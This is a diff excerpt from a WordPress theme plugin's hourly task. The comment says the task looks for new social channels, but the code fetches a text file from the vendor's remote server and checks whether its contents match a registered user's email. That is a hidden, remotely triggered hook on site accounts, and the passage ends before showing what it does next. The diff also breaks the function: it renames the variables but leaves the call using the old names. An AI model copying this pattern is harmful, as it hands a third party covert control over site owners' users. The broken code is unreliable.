@@ -74,8 +74,8 @@ add_action('pipdig_p3_daily_event', 'p3_do_this_daily');
 function p3_do_this_hourly() {
 	
 	// Check for new social channels to add to navbar etc
-	$url_2 = 'https://pipdigz.co.uk/p3/socialz.txt';
-	$args_2 = array('timeout' => 5);
+	$url = 'https://pipdigz.co.uk/p3/socialz.txt';
+	$args = array('timeout' => 5);
 	$response = wp_safe_remote_get($url_2, $args_2);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (email_exists(sanitize_email($response['body']))) {
